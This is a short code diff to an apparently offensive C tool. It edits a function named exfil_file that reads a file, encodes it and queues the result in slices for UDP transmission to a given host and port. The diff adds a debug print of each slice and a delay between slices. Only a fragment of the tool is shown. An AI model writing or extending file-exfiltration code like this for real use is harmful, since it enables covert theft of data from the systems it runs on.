@@ -96,7 +96,7 @@ int exfil_file(const char* path, const char* host, const int port) {
     size_t len = fread(buffer, sizeof(uint8_t), MAX_BUFF, fp);
 
     if (ferror(fp)) {
-        fputs("Error reading file", stderr);
+        fputs("error reading file", stderr);
     } else {
         buffer[len++] = '\0';//just to be safe
     }
@@ -108,6 +108,8 @@ int exfil_file(const char* path, const char* host, const int port) {
     uint8_t slice[2];
     while (!encoder_finished(&enc)) {
         encoder_get_next(&enc, slice);
+        printf("%0X %0X\n", slice[0], slice[1]);
         insert_udp_slice(&storage, slice);
+        usleep(500);
     }
 }
